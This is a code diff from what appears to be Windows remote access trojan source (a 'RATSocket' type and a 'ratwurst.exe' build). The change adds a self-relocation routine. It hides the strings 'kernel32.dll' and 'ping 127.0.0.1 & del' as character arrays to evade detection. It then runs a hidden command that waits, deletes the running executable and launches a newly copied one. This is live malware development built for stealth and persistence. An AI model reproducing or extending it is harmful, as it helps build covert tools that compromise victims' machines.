@@ -205,7 +205,7 @@ UploadFile(RATSocket* ratSocket,
 	}
 }
 
-void RunCommandInProcess(char *commandToRun, int waitForProcess)
+int RunCommandInProcess(char *commandToRun, int waitForProcess)
 {
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si = { };
@@ -231,7 +231,8 @@ void RunCommandInProcess(char *commandToRun, int waitForProcess)
 		char bufferError[256];
 		sprintf_s(bufferError, "CreateProcess failed (%d).\n", GetLastError());
 		OutputDebugStringA(bufferError);
-#endif		
+#endif
+		return 1;
 	}
 
 	if ( waitForProcess )
@@ -243,6 +244,7 @@ void RunCommandInProcess(char *commandToRun, int waitForProcess)
 		gf_CloseHandle(pi.hProcess);
 		gf_CloseHandle(pi.hThread);
 	}
+	return 0;
 }
 
 int
@@ -303,9 +305,6 @@ WinMain(HINSTANCE hInstance,
 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
 
-	RunCommandInProcess("ping 127.0.0.1 & del X:\\build\\ratwurst.exe", 0);
-	return 0;
-	
 	char currentPath[MAX_PATH];
 	if ( GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0 )
 	{
@@ -350,6 +349,18 @@ WinMain(HINSTANCE hInstance,
 			OutputDebugStringA(buffer);
 #endif		
 		}
+
+		// Runs a cmd process: Waits for a while, deletes the current file, and then runs the newly copied file
+		//
+		char pingCommand[] = { 'p','i','n','g',' ','1','2','7','.','0','.','0','.','1',' ','&',' ','d','e','l',' ',0 };
+		size_t pingCommandLength = strlen(pingCommand);
+		char commandToRun[MAX_PATH * 2 + 30] = {};
+		strncpy_s(commandToRun, pingCommand, pingCommandLength);
+		strncat_s(commandToRun, currentPath, strlen(currentPath));
+		strncat_s(commandToRun, " & call ", strlen(currentPath));
+		strncat_s(commandToRun, newPath, strlen(newPath));
+		
+		RunCommandInProcess(commandToRun, 0);
 		return 0;
 	}
 	
